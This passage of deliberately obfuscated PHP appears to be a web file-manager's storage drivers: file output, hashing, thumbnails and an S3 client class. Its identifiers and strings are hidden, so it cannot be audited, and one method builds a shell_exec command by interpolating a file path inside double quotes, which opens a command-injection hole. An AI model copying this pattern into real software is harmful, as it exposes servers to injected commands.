getCdnLink($C‘ŠÀÊƒ×—) { $b¢Ñ»Œå£Í =& $_SERVER[£ü]; if (!$this->isCdnHost()) { return $C‘ŠÀÊƒ×—; } return str_replace(trim(get_url_root($C‘ŠÀÊƒ×—), $b¢Ñ»Œå£Í[8]), trim($this->cdnHost, $b¢Ñ»Œå£Í[8]), $C‘ŠÀÊƒ×—); } public function uploadLink($AƒØ¡—ÑóÒ, $EäË½–öå§ = 0) { goto Fßè¥½ëêÇ; Fßè¥½ëêÇ: $D²åİÔæ‚õ =& $_SERVER[£ü]; if ($this->isUploadServer()) { return; } $a”´õ¨ôÈö = $this->getType(); goto Eé´¢˜åã‘; e½ñæ­à¸Æ: if ($CĞõİ½Ù«Œ) { $CĞõİ½Ù«Œ[$D²åİÔæ‚õ[89]] = $AƒØ¡—ÑóÒ; $CĞõİ½Ù«Œ[$D²åİÔæ‚õ[90]] = $a”´õ¨ôÈö; } return $CĞõİ½Ù«Œ; goto c™Â‡®…Ó­; B±•‰¤Àßˆ: $DœÈçó‡® = $EäË½–öå§ <= $a™ë×ó¡º ? $D²åİÔæ‚õ[87] : $D²åİÔæ‚õ[88]; $e¸©—Å¬î = (!$EäË½–öå§ ? 1 : ceil($EäË½–öå§ / pow(1024, 3))) * 3600 * 4; $CĞõİ½Ù«Œ = $this->{$DœÈçó‡®}($AƒØ¡—ÑóÒ, $e¸©—Å¬î); goto e½ñæ­à¸Æ; Eé´¢˜åã‘: if (!in_array($a”´õ¨ôÈö, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $a™ë×ó¡º = 1024 * 1024 * 10; goto B±•‰¤Àßˆ; c™Â‡®…Ó­: } public function uploadFormData($fğ‘Ù¤‘¢¡, $f…ƒƒ½ÇÑ… = 3600) { } public function multiUploadFormData($Aßâ´‰·–, $b§»ñğøÌ = 3600) { } public function osChunkSize() { $E­—‰ÑÇÊ =& $_SERVER[£ü]; $Dº¨ÌË‰ò = (double) $GLOBALS[$E­—‰ÑÇÊ[6]][$E­—‰ÑÇÊ[84]][$E­—‰ÑÇÊ[91]][$E­—‰ÑÇÊ[92]]; if (!$Dº¨ÌË‰ò) { $Dº¨ÌË‰ò = 1024 * 84 * 10; } return $Dº¨ÌË‰ò; } public function download($aì­ÓÒœ§, $DÚàòÇ÷š©) { } public function ext($b˜¬ÑŒƒ) { $c”šÇ¼Ìì =& $_SERVER[£ü]; if (strpos($b˜¬ÑŒƒ, $c”šÇ¼Ìì[8]) === -1) { $E¨©ôíôŞ¯ = $b˜¬ÑŒƒ; } else { $E¨©ôíôŞ¯ = $this->pathThis($b˜¬ÑŒƒ); } $a×ºˆê¹®À = $c”šÇ¼Ìì[33]; if (strstr($E¨©ôíôŞ¯, $c”šÇ¼Ìì[93])) { $a×ºˆê¹®À = substr($E¨©ôíôŞ¯, strrpos($E¨©ôíôŞ¯, $c”šÇ¼Ìì[93]) + 1); $a×ºˆê¹®À = strtolower($a×ºˆê¹®À); } if (strlen($a×ºˆê¹®À) > 3 && preg_match($c”šÇ¼Ìì[94], $a×ºˆê¹®À, $F¸‰ÛÙªŠÌ)) { $a×ºˆê¹®À = $c”šÇ¼Ìì[33]; } return $a×ºˆê¹®À; } public function pathThis($Dì¾®…ˆ¥†) { $a¶‰Àæ¼í‚ =& $_SERVER[£ü]; $Dì¾®…ˆ¥† = str_replace($a¶‰Àæ¼í‚[95], $a¶‰Àæ¼í‚[8], rtrim($Dì¾®…ˆ¥†, $a¶‰Àæ¼í‚[8])); $F¹ÄãÍ·ˆ = strrpos($Dì¾®…ˆ¥†, $a¶‰Àæ¼í‚[8]); if ($F¹ÄãÍ·ˆ === !1) { return $Dì¾®…ˆ¥†; } return substr($Dì¾®…ˆ¥†, $F¹ÄãÍ·ˆ + 1); } public function pathFather($DÌÂ­Éô‘) { $cÓŒ†·ØĞ» =& $_SERVER[£ü]; $DÌÂ­Éô‘ = str_replace($cÓŒ†·ØĞ»[95], $cÓŒ†·ØĞ»[8], rtrim($DÌÂ­Éô‘, $cÓŒ†·ØĞ»[8])); $d”ŠÁé–ç = strrpos($DÌÂ­Éô‘, $cÓŒ†·ØĞ»[8]); if ($d”ŠÁé–ç === !1) { return $cÓŒ†·ØĞ»[33]; } return substr($DÌÂ­Éô‘, 0, $d”ŠÁé–ç + 1); } public function hashSimple($bØ‡Ôëè¶) { goto Fº‘ÁÌå¬„; D±­Ø‡óİğ: $cŠê±àİ‘š = intval($B´ĞÍ…‘ê¤ / $F²±Œ¹’œ); $Aº¤ç“‘øµ = $Dˆ…ŞçÃ½[33]; for ($dæ‚ø‘‹ = 0; $dæ‚ø‘‹ < $F²±Œ¹’œ; $dæ‚ø‘‹++) { $Aº¤ç“‘øµ .= $this->fileSubstr($bØ‡Ôëè¶, $cŠê±àİ‘š * $dæ‚ø‘‹, $cÎ²Öµä”); } goto EÂ­Øª˜ßÅ; EÂ­Øª˜ßÅ: $Aº¤ç“‘øµ .= $this->fileSubstr($bØ‡Ôëè¶, $B´ĞÍ…‘ê¤ - $cÎ²Öµä”, $cÎ²Öµä”); return md5($Aº¤ç“‘øµ) . $B´ĞÍ…‘ê¤; goto aËé†¾Ş™; Fº‘ÁÌå¬„: $Dˆ…ŞçÃ½ =& $_SERVER[£ü]; if (!$bØ‡Ôëè¶) { return md5($Dˆ…ŞçÃ½[33]); } $B´ĞÍ…‘ê¤ = $this->size($bØ‡Ôëè¶); goto eÆ÷³°Ö¹è; eÆ÷³°Ö¹è: $cÎ²Öµä” = 200; $F²±Œ¹’œ = 50; if ($B´ĞÍ…‘ê¤ <= $cÎ²Öµä” * $F²±Œ¹’œ) { return $this->hashMd5($bØ‡Ôëè¶) . $B´ĞÍ…‘ê¤; } goto D±­Ø‡óİğ; aËé†¾Ş™: } public static $md5Cache = array(); public function hashMd5($D’ò¹¥¬¸ñ) { $D’ò¹¥¬¸ñ = $this->iconvSystem($D’ò¹¥¬¸ñ); if (isset(self::$md5Cache[$D’ò¹¥¬¸ñ])) { return self::$md5Cache[$D’ò¹¥¬¸ñ]; } self::$md5Cache[$D’ò¹¥¬¸ñ] = $this->hashMd5Shell($D’ò¹¥¬¸ñ); if (!self::$md5Cache[$D’ò¹¥¬¸ñ]) { self::$md5Cache[$D’ò¹¥¬¸ñ] = @md5_file($D’ò¹¥¬¸ñ); } return self::$md5Cache[$D’ò¹¥¬¸ñ]; } private function hashMd5Shell($Aô°‡õŞ¢´) { goto C»‚®ŒÍ ë; eÈ²Ä›³­Ü: $EØ‰°ßÖ¾ù = shell_exec($a…èÑË÷™ . "\x20\42{$Aô°‡õŞ¢´}\x22"); return substr($EØ‰°ßÖ¾ù, 0, 32); goto F¬äƒÏœÛÒ; C»‚®ŒÍ ë: $DÓƒÁ’é¤Ø =& $_SERVER[£ü]; if (!function_exists($DÓƒÁ’é¤Ø[96])) { return !1; } $dˆƒ¨¤“Û÷ = array($DÓƒÁ’é¤Ø[97], $DÓƒÁ’é¤Ø[98]); goto A™Ñ‘†Ç; A™Ñ‘†Ç: $a…èÑË÷™ = Cache::get($DÓƒÁ’é¤Ø[99]); if (!$a…èÑË÷™) { $F”¹÷ÖÌàØ = BASIC_PATH . $DÓƒÁ’é¤Ø[100]; $d¹é¥áòˆ³ = md5_file($F”¹÷ÖÌàØ); $a…èÑË÷™ = $DÓƒÁ’é¤Ø[101]; foreach ($dˆƒ¨¤“Û÷ as $F­ò‚ˆ²Œî) { $EØ‰°ßÖ¾ù = shell_exec($F­ò‚ˆ²Œî . "\40\x22{$F”¹÷ÖÌàØ}\42"); if ($EØ‰°ßÖ¾ù && substr(trim($EØ‰°ßÖ¾ù), 0, 32) == $d¹é¥áòˆ³) { $a…èÑË÷™ = $F­ò‚ˆ²Œî; break; } } Cache::set($DÓƒÁ’é¤Ø[99], $a…èÑË÷™, 3600); } if ($a…èÑË÷™ == $DÓƒÁ’é¤Ø[101]) { return !1; } goto eÈ²Ä›³­Ü; F¬äƒÏœÛÒ: } public function link($F‹ÒÖèæä) { return $F‹ÒÖèæä; } public function fileOut($F±É¶åŸîë, $aãà±°ñ¹ = false, $bê†Œ„´ŒÑ = false, $D£Ô˜÷“”ì = '') { goto b·Ù¹¢¨”á; fœ¬Ö„Ë‚²: header($cä‘Ø‚Œñ[132] . $A†ìÙ§Ë¯ˆ . $cä‘Ø‚Œñ[124]); header($cä‘Ø‚Œñ[133] . $aç¥èÈîò³); header($cä‘Ø‚Œñ[134]); goto döö•‰Ÿ£È; Eóìåø¸…: $cÕÙéƒÔÙ³ = get_file_mime($E¦º›İÈãó); if (strstr($cÕÙéƒÔÙ³, $cä‘Ø‚Œñ[114])) { $cÕÙéƒÔÙ³ = $cÕÙéƒÔÙ³ . $cä‘Ø‚Œñ[115]; } if ($aãà±°ñ¹ === !1 && !mime_support($cÕÙéƒÔÙ³)) { $aãà±°ñ¹ = !0; $cÕÙéƒÔÙ³ = $cä‘Ø‚Œñ[116]; } goto b»æ¡ÀùØ®; a¬±‡ºãËâ: @ob_end_clean(); set_timeout(); $f¼à«ñ³’Ø = $this->infoFull($F±É¶åŸîë); goto b®…»ê; B‡³È¦ççÒ: $CÚæßŠö• = 0; $Fµ¶ÙÓèö = $aŞ´Èï¸©ˆ - 1; $E¦º›İÈãó = $this->ext($aç¥èÈîò³); goto d¾ù¢ê´“Ã; bËì¬¤­œé: header($cä‘Ø‚Œñ[150] . ($Fµ¶ÙÓèö - $CÚæßŠö• + 1)); if ($_SERVER[$cä‘Ø‚Œñ[151]] == $cä‘Ø‚Œñ[152]) { return; } $DÂ¼Ê£¶Í¨ = 1024 * 100; goto E½®ï½¨Š; b·Ù¹¢¨”á: $cä‘Ø‚Œñ =& $_SERVER[£ü]; $this->cacheMethod(null, null); if (!$F±É¶åŸîë || !$this->exist($F±É¶åŸîë)) { show_json(LNG($cä‘Ø‚Œñ[102]), !1, $bê†Œ„´ŒÑ); } goto Dá£ßôîâò; CêœÔÀğ‚: $a¥±ØÑœÒÕ = strtolower($_SERVER[$cä‘Ø‚Œñ[138]]); if ($DÙé¿Â÷® && $a¥±ØÑœÒÕ && $E‹Ã’éë…) { if (strstr($a¥±ØÑœÒÕ, $cä‘Ø‚Œñ[139])) { header($cä‘Ø‚Œñ[140] . $F±É¶åŸîë); } else { if (strstr($a¥±ØÑœÒÕ, $cä‘Ø‚Œñ[141])) { header($cä‘Ø‚Œñ[142] . $F±É¶åŸîë); } else { if (strstr($a¥±ØÑœÒÕ, $cä‘Ø‚Œñ[143])) { header($cä‘Ø‚Œñ[144] . $F±É¶åŸîë); } } } if ($dˆù®†—òƒ) { header($cä‘Ø‚Œñ[145] . $dˆù®†—òƒ); } return; } if (isset($_SERVER[$cä‘Ø‚Œñ[146]])) { if (preg_match($cä‘Ø‚Œñ[147], $_SERVER[$cä‘Ø‚Œñ[146]], $E£æïî¥‡)) { $CÚæßŠö• = intval($E£æïî¥‡[1]); if (!empty($E£æïî¥‡[2])) { $Fµ¶ÙÓèö = intval($E£æïî¥‡[2]); } } header($cä‘Ø‚Œñ[148]); header("\103\x6f\156\164\x65\156\164\55\122\141\156\x67\145\x3a\40\x62\171\x74\x65\163\x20{$CÚæßŠö•}\55{$Fµ¶ÙÓèö}\57" . $aŞ´Èï¸©ˆ); } else { header($cä‘Ø‚Œñ[149]); } goto bËì¬¤­œé; döö•‰Ÿ£È: header($cä‘Ø‚Œñ[135] . $aŞ´Èï¸©ˆ); header($cä‘Ø‚Œñ[136]); if (!$aãà±°ñ¹ && $E¦º›İÈãó == $cä‘Ø‚Œñ[137]) { if ($aŞ´Èï¸©ˆ > 1024 * 1024 * 5) { die; } $cøÚ„¨¿¬Å = $this->getContent($F±É¶åŸîë); $cøÚ„¨¿¬Å = Html::removeXXS($cøÚ„¨¿¬Å); echo $cøÚ„¨¿¬Å; die; } goto CêœÔÀğ‚; b»æ¡ÀùØ®: $aàÌÌÛ©ãà = rawurlencode($aç¥èÈîò³); $aàÌÌÛ©ãà = $cä‘Ø‚Œñ[113] . $aàÌÌÛ©ãà . $cä‘Ø‚Œñ[117] . $aàÌÌÛ©ãà; if ($aãà±°ñ¹) { header($cä‘Ø‚Œñ[118]); header($cä‘Ø‚Œñ[119] . $aàÌÌÛ©ãà); } else { header($cä‘Ø‚Œñ[120] . $aàÌÌÛ©ãà); } goto d«İë¾—Ø´; b®…»ê: $aŞ´Èï¸©ˆ = $f¼à«ñ³’Ø[$cä‘Ø‚Œñ[77]]; $A†ìÙ§Ë¯ˆ = gmdate($cä‘Ø‚Œñ[106], $f¼à«ñ³’Ø[$cä‘Ø‚Œñ[107]]); $aç¥èÈîò³ = $bê†Œ„´ŒÑ ? $bê†Œ„´ŒÑ : $this->iconvApp($f¼à«ñ³’Ø[$cä‘Ø‚Œñ[28]]); goto B‡³È¦ççÒ; d«İë¾—Ø´: header($cä‘Ø‚Œñ[121]); header($cä‘Ø‚Œñ[122] . $cÕÙéƒÔÙ³); header($cä‘Ø‚Œñ[123] . gmdate($cä‘Ø‚Œñ[106], time() + 3600 * 24 * 30) . $cä‘Ø‚Œñ[124]); goto eîŒË¸Çãš; E½®ï½¨Š: $Dß¼­‰è·ì = 0; if ($dˆù®†—òƒ) { $Dß¼­‰è·ì = intval(1000 * 1000 * ($DÂ¼Ê£¶Í¨ / $dˆù®†—òƒ)); } while ($CÚæßŠö• <= $Fµ¶ÙÓèö) { $A‘œñ™ïöÖ = timeFloat(); check_abort(); $eàå–‚ë = $Fµ¶ÙÓèö - $CÚæßŠö• + 1; if ($eàå–‚ë <= $DÂ¼Ê£¶Í¨) { $DÂ¼Ê£¶Í¨ = $eàå–‚ë; } echo $this->fileSubstr($F±É¶åŸîë, $CÚæßŠö•, $DÂ¼Ê£¶Í¨); $CÚæßŠö• += $DÂ¼Ê£¶Í¨; if ($DÂ¼Ê£¶Í¨ == $eàå–‚ë) { $CÚæßŠö• = $Fµ¶ÙÓèö + 1; } if ($Dß¼­‰è·ì) { $FìÎùá¯Ï‡ = intval(1000 * 1000 * (timeFloat() - $A‘œñ™ïöÖ)); $Bæ¨¤Ööš = $Dß¼­‰è·ì - $FìÎùá¯Ï‡; if ($Bæ¨¤Ööš > 5) { usleep($Bæ¨¤Ööš); } } } goto b¸ôîÆŒäĞ; d¾ù¢ê´“Ã: if (in_array($E¦º›İÈãó, array($cä‘Ø‚Œñ[108], $cä‘Ø‚Œñ[109], $cä‘Ø‚Œñ[110], $cä‘Ø‚Œñ[111]))) { $E¦º›İÈãó = $cä‘Ø‚Œñ[112]; } if (!$D£Ô˜÷“”ì) { $D£Ô˜÷“”ì = md5($A†ìÙ§Ë¯ˆ . $this->hashSimple($F±É¶åŸîë)); } $D£Ô˜÷“”ì = $cä‘Ø‚Œñ[113] . $D£Ô˜÷“”ì . $cä‘Ø‚Œñ[113]; goto Eóìåø¸…; eîŒË¸Çãš: header($cä‘Ø‚Œñ[125]); header($cä‘Ø‚Œñ[126]); header($cä‘Ø‚Œñ[127]); goto a®êÚ  Å¼; a®êÚ  Å¼: if (isset($_SERVER[$cä‘Ø‚Œñ[128]]) && strtotime($_SERVER[$cä‘Ø‚Œñ[128]]) == $f¼à«ñ³’Ø[$cä‘Ø‚Œñ[107]]) { header($cä‘Ø‚Œñ[129], !0, 304); die; } if (isset($_SERVER[$cä‘Ø‚Œñ[130]]) && $_SERVER[$cä‘Ø‚Œñ[130]] == $D£Ô˜÷“”ì) { header($cä‘Ø‚Œñ[131] . $D£Ô˜÷“”ì, !0, 304); die; } header($cä‘Ø‚Œñ[131] . $D£Ô˜÷“”ì); goto fœ¬Ö„Ë‚²; Dá£ßôîâò: $DÙé¿Â÷® = $this->getType() == $cä‘Ø‚Œñ[103]; $E‹Ã’éë… = $GLOBALS[$cä‘Ø‚Œñ[6]][$cä‘Ø‚Œñ[84]][$cä‘Ø‚Œñ[91]][$cä‘Ø‚Œñ[104]]; $dˆù®†—òƒ = (double) $GLOBALS[$cä‘Ø‚Œñ[6]][$cä‘Ø‚Œñ[84]][$cä‘Ø‚Œñ[91]][$cä‘Ø‚Œñ[105]] * 1024 * 1024; goto a¬±‡ºãËâ; b¸ôîÆŒäĞ: } public function fileOutServer($AëàğŠ˜ŞÖ, $cåâÊ‘ãœó = false, $c½ÔĞíŞê = false, $D©Öë½°í = '') { $this->fileOut($AëàğŠ˜ŞÖ, $cåâÊ‘ãœó, $c½ÔĞíŞê, $D©Öë½°í); } public function fileOutLink($DŒ£–÷™±ª) { header($_SERVER[£ü][153] . $DŒ£–÷™±ª); die; } public function cacheMethod($E×»ÁŸÂî¤, $CŒÃåĞ¬ÁÈ) { goto a—¬áº´Š; F÷ÑÄŠ×ãİ: return $E§ÚÀâ«·İ; goto e¥Ú¯½¥¿¬; E½ùÂ‰í¹„: if (is_null($E×»ÁŸÂî¤)) { $BÛæ¸èš·¸ = array(); return; } if (is_null($CŒÃåĞ¬ÁÈ)) { unset($BÛæ¸èš·¸[$B¹µî¿Ëôá]); return; } $E§ÚÀâ«·İ = isset($BÛæ¸èš·¸[$B¹µî¿Ëôá]) ? $BÛæ¸èš·¸[$B¹µî¿Ëôá] : null; goto c¼¬”¡õÑ; a—¬áº´Š: $aÛØ–å·Çõ =& $_SERVER[£ü]; static $BÛæ¸èš·¸ = array(); $B¹µî¿Ëôá = $aÛØ–å·Çõ[154] . $E×»ÁŸÂî¤ . $aÛØ–å·Çõ[155] . rtrim($CŒÃåĞ¬ÁÈ, $aÛØ–å·Çõ[8]); goto E½ùÂ‰í¹„; c¼¬”¡õÑ: if (!is_null($E§ÚÀâ«·İ)) { return $E§ÚÀâ«·İ; } $E§ÚÀâ«·İ = $this->{$E×»ÁŸÂî¤}($CŒÃåĞ¬ÁÈ); $BÛæ¸èš·¸[$B¹µî¿Ëôá] = $E§ÚÀâ«·İ; goto F÷ÑÄŠ×ãİ; e¥Ú¯½¥¿¬: } public function fileOutImage($e¯‡ğŠò¬œ, $e†Å† ‰á÷ = 250) { goto Aôª»Êâ§‡; eâáŠÜêï´: if (!($fÀÜ™ôòáø = IO::move($e‹ôÒÉÃ, $dŠøİ–ëË))) { return IO::fileOut($e‹ôÒÉÃ); } del_file($e‹ôÒÉÃ); IO::fileOut($fÀÜ™ôòáø); goto DÌÛ¿Û»; fÄ÷±Ò¹œà: if ($AÌÂ´ªŸ¦[$d©”…‡Ç«¦[77]] <= 1024 * 50 || !function_exists($d©”…‡Ç«¦[156]) || $AÌÂ´ªŸ¦[$d©”…‡Ç«¦[157]] == $d©”…‡Ç«¦[158]) { return $this->fileOut($e¯‡ğŠò¬œ); } if (isset($AÌÂ´ªŸ¦[$d©”…‡Ç«¦[159]][$d©”…‡Ç«¦[160]])) { $CË«Ë±‡­÷ = $AÌÂ´ªŸ¦[$d©”…‡Ç«¦[159]][$d©”…‡Ç«¦[160]]; } else { if (isset($AÌÂ´ªŸ¦[$d©”…‡Ç«¦[159]][$d©”…‡Ç«¦[161]])) { $CË«Ë±‡­÷ = $AÌÂ´ªŸ¦[$d©”…‡Ç«¦[159]][$d©”…‡Ç«¦[161]]; } else { $CË«Ë±‡­÷ = md5("{$AÌÂ´ªŸ¦[$d©”…‡Ç«¦[28]]}\x5f{$AÌÂ´ªŸ¦[$d©”…‡Ç«¦[75]]}\x5f{$AÌÂ´ªŸ¦[$d©”…‡Ç«¦[77]]}"); } } $Bæõ‘ÙµŸÛ = "{$CË«Ë±‡­÷}\137{$e†Å† ‰á÷}\56\x70\x6e\x67"; goto Aƒİ®èµÌº; DÎÑÚ…ä¦‹: $e‹ôÒÉÃ = DATA_THUMB . $Bæõ‘ÙµŸÛ; if (!@file_exists($e‹ôÒÉÃ)) { $C‚ö–¿ê¦â = TEMP_FILES; if (!is_dir($C‚ö–¿ê¦â)) { mk_dir($C‚ö–¿ê¦â); } $F›øÉÄ˜Œô = $C‚ö–¿ê¦â . $CË«Ë±‡­÷ . $d©”…‡Ç«¦[93] . $AÌÂ´ªŸ¦[$d©”…‡Ç«¦[157]]; if (!@file_exists($F›øÉÄ˜Œô)) { $F›øÉÄ˜Œô = $this->download($e¯‡ğŠò¬œ, $F›øÉÄ˜Œô); } $a¬Ş«˜§ğ“ = new ImageThumb($F›øÉÄ˜Œô, $d©”…‡Ç«¦[164]); $a¬Ş«˜§ğ“->prorate($e‹ôÒÉÃ, $e†Å† ‰á÷, $e†Å† ‰á÷ * 10); } if (!file_exists($e‹ôÒÉÃ) || filesize($e‹ôÒÉÃ) < 100) { return @file_exists($F›øÉÄ˜Œô) ? IO::fileOut($F›øÉÄ˜Œô) : $this->fileOut($e¯‡ğŠò¬œ); } goto eâáŠÜêï´; Aƒİ®èµÌº: if (!($C¬›¿Ÿ±Õ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $d©”…‡Ç«¦[162]))) { $dŠøİ–ëË = IO::mkdir(IO_PATH_SYSTEM_TEMP . $d©”…‡Ç«¦[163]); } else { $dŠøİ–ëË = KodIO::make($C¬›¿Ÿ±Õ); } if ($C¬›¿Ÿ±Õ = IO::fileNameExist($dŠøİ–ëË, $Bæõ‘ÙµŸÛ)) { $e‹ôÒÉÃ = KodIO::make($C¬›¿Ÿ±Õ); return IO::fileOut($e‹ôÒÉÃ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto DÎÑÚ…ä¦‹; Aôª»Êâ§‡: $d©”…‡Ç«¦ =& $_SERVER[£ü]; if (substr($e¯‡ğŠò¬œ, 0, 4) == $d©”…‡Ç«¦[143]) { $this->fileOutLink($e¯‡ğŠò¬œ); } $AÌÂ´ªŸ¦ = $this->info($e¯‡ğŠò¬œ); goto fÄ÷±Ò¹œà; DÌÛ¿Û»: } public function fileOutImageServer($d©âŠÙá‡İ, $Dï¿¡×¨µˆ = 250) { $this->fileOutImage($d©âŠÙá‡İ, $Dï¿¡×¨µˆ); } public function fileNameAuto($AñäöÌ“Ø, $AÌ™–çóø…, $d¢Æè„† = REPEAT_RENAME, $eÏ¹İÄ‚è = false) { goto Aİ¾Ïß˜©‡; E‰ò“ö½õß: $EøÖ¦¼ªõ = 1; $AÄ“ğŸæ•Š = substr($AÌ™–çóø…, 0, strlen($AÌ™–çóø…) - strlen($aŞÄ±¡ïÑ )); $BòÎœ’æ = $AÄ“ğŸæ•Š . "\50{$EøÖ¦¼ªõ}\51{$aŞÄ±¡ïÑ }"; goto D®„íÒªÅ÷; D®„íÒªÅ÷: while ($this->exist(rtrim($AñäöÌ“Ø, $e–¹¬ÀóÙ[8]) . $e–¹¬ÀóÙ[8] . $BòÎœ’æ)) { $BòÎœ’æ = $AÄ“ğŸæ•Š . "\50{$EøÖ¦¼ªõ}\x29{$aŞÄ±¡ïÑ }"; $EøÖ¦¼ªõ++; } return $BòÎœ’æ; goto BÜ¶ƒªô£; cÔé¬“ôõÙ: if ($d¢Æè„† == REPEAT_SKIP) { return !1; } $aŞÄ±¡ïÑ  = $e–¹¬ÀóÙ[93] . get_path_ext($AÌ™–çóø…); $aŞÄ±¡ïÑ  = $aŞÄ±¡ïÑ  == $e–¹¬ÀóÙ[93] || $eÏ¹İÄ‚è ? $e–¹¬ÀóÙ[33] : $aŞÄ±¡ïÑ ; goto E‰ò“ö½õß; Aİ¾Ïß˜©‡: $e–¹¬ÀóÙ =& $_SERVER[£ü]; $a‰á½¥Æì = $AñäöÌ“Ø === $e–¹¬ÀóÙ[33] ? $AÌ™–çóø… : rtrim($AñäöÌ“Ø, $e–¹¬ÀóÙ[8]) . $e–¹¬ÀóÙ[8] . $AÌ™–çóø…; if ($d¢Æè„† == REPEAT_REPLACE || !$this->exist($a‰á½¥Æì) || $eÏ¹İÄ‚è && $d¢Æè„† != REPEAT_RENAME_FOLDER) { return $AÌ™–çóø…; } goto cÔé¬“ôõÙ; BÜ¶ƒªô£: } public function listAllFiles($F¶¯²Ò à, $dÒù™Éî˜, $F§óÎî¢˜ò = array()) { goto BÙ©ª²æÑ; aÈÆœ‡¦×å: foreach (array_unique($c›¤“¦°ˆ) as $cˆ„µßğÎ”) { $fß»¨ö”• = array($bä²¬Ê¿Î[75] => $this->getPathOuter($bä²¬Ê¿Î[8] . $F¶¯²Ò à . $bä²¬Ê¿Î[8] . $cˆ„µßğÎ”), $bä²¬Ê¿Î[76] => 1, $bä²¬Ê¿Î[77] => 0); if (substr($cˆ„µßğÎ”, -1) != $bä²¬Ê¿Î[8]) { $fß»¨ö”•[$bä²¬Ê¿Î[76]] = 0; $A²ì†ã’«¼ = $this->getPath($F¶¯²Ò à . $bä²¬Ê¿Î[8] . $cˆ„µßğÎ”); $fß»¨ö”•[$bä²¬Ê¿Î[77]] = isset($F§óÎî¢˜ò[$A²ì†ã’«¼]) ? $F§óÎî¢˜ò[$A²ì†ã’«¼] : $this->size($A²ì†ã’«¼); } $FÆ¼¶×¾ò…[] = $fß»¨ö”•; } return $FÆ¼¶×¾ò…; goto B‘‘¹Ş¤Š’; BÙ©ª²æÑ: $bä²¬Ê¿Î =& $_SERVER[£ü]; if (empty($dÒù™Éî˜)) { return array(); } $c›¤“¦°ˆ = array(); goto Dó¿§¦áé; Dó¿§¦áé: $F¶¯²Ò à = trim($F¶¯²Ò à, $bä²¬Ê¿Î[8]); foreach ($dÒù™Éî˜ as $cˆ„µßğÎ”) { $eõØƒç÷¡ = ltrim(substr($cˆ„µßğÎ”, strlen($F¶¯²Ò à)), $bä²¬Ê¿Î[8]); $c›¤“¦°ˆ = array_merge($c›¤“¦°ˆ, $this->slicePath($eõØƒç÷¡)); } $FÆ¼¶×¾ò… = array(); goto aÈÆœ‡¦×å; B‘‘¹Ş¤Š’: } public function slicePath($F…Éœã¥ŒË) { $Bï¿ï¯ÚÇ÷ =& $_SERVER[£ü]; $e¹êàÊ•¬ = explode($Bï¿ï¯ÚÇ÷[8], trim($F…Éœã¥ŒË, $Bï¿ï¯ÚÇ÷[8])); $BŠ‡•òå‘ = 0; do { ++$BŠ‡•òå‘; $b‰µÜêáõ[] = implode($Bï¿ï¯ÚÇ÷[8], array_slice($e¹êàÊ•¬, 0, $BŠ‡•òå‘)) . $Bï¿ï¯ÚÇ÷[8]; } while ($BŠ‡•òå‘ < count($e¹êàÊ•¬)); $b‰µÜêáõ[count($e¹êàÊ•¬) - 1] = $F…Éœã¥ŒË; return $b‰µÜêáõ; } public function getHost() { $AÎ½”ÇÌª =& $_SERVER[£ü]; $c“§ö·³à„ = parse_url(trim($this->domain, $AÎ½”ÇÌª[8])); $f•ˆ¬¿¤æ× = isset($c“§ö·³à„[$AÎ½”ÇÌª[165]]) ? $c“§ö·³à„[$AÎ½”ÇÌª[165]] : http_type(); $fí³µ‹ëùç = isset($c“§ö·³à„[$AÎ½”ÇÌª[166]]) ? $c“§ö·³à„[$AÎ½”ÇÌª[166]] : $c“§ö·³à„[$AÎ½”ÇÌª[75]]; if (isset($c“§ö·³à„[$AÎ½”ÇÌª[167]])) { $fí³µ‹ëùç .= $AÎ½”ÇÌª[4] . $c“§ö·³à„[$AÎ½”ÇÌª[167]]; } return $f•ˆ¬¿¤æ× . $AÎ½”ÇÌª[168] . $fí³µ‹ëùç; } public function pathEncode($dæ„‚™øß×) { $a‹»¹¾œª =& $_SERVER[£ü]; return str_replace($a‹»¹¾œª[169], $a‹»¹¾œª[8], rawurlencode($dæ„‚™øß×)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($Bç Ÿ¼Ì) { set_timeout(); require_once SDK_DIR . $_SERVER[£ü][170]; parent::__construct(); $this->_init($Bç Ÿ¼Ì); } public function _init($e­¨…‡“ª) { foreach ($e­¨…‡“ª as $bğİæ·Ù => $dš™‡ç‰²) { if (isset($this->{$bğİæ·Ù})) { $this->{$bğİæ·Ù} = $dš™‡ç‰²; } } $this->endpoint = $e­¨…‡“ª[$_SERVER[£ü][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($B»¨Œ¡–®Â = "\166\64") { $this->signVer = $B»¨Œ¡–®Â; $this->client->setSignatureVersion($B»¨Œ¡–®Â); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto C„çëÎÅµ‘; C„çëÎÅµ‘: $fÌ«àóœªË =& $_SERVER[£ü]; $Cé¿“†¨í± = $this->getBucketCors(); if (!$Cé¿“†¨í± || !is_array($Cé¿“†¨í±)) { return !1; } goto c›¡ï¡¢ˆ; a…Ä›Ç…™: $CêòÏ¦ÑÜŠ = array($fÌ«àóœªË[177], $fÌ«àóœªË[178], $fÌ«àóœªË[179], $fÌ«àóœªË[180], $fÌ«àóœªË[181]); $AÂƒœ³à§Ö = array_diff($CêòÏ¦ÑÜŠ, $FñŒ¸ñ†ï); return empty($AÂƒœ³à§Ö); goto f—é† ¯î…; c›¡ï¡¢ˆ: if ($Cé¿“†¨í±[$fÌ«àóœªË[172]] != $fÌ«àóœªË[173] || $Cé¿“†¨í±[$fÌ«àóœªË[174]] != $fÌ«àóœªË[173]) { return !1; } $FñŒ¸ñ†ï = array_map($fÌ«àóœªË[175], $Cé¿“†¨í±[$fÌ«àóœªË[176]]); if (!is_array($FñŒ¸ñ†ï)) { $FñŒ¸ñ†ï = array(); } goto a…Ä›Ç…™; f—é† ¯î…: } public function mkfile($FÂ†ŞÅ¦À, $Aìñå±ÉÖ = '', $E‚æ·ñÉ·Í = REPEAT_RENAME) { $bƒÒñ¤ = 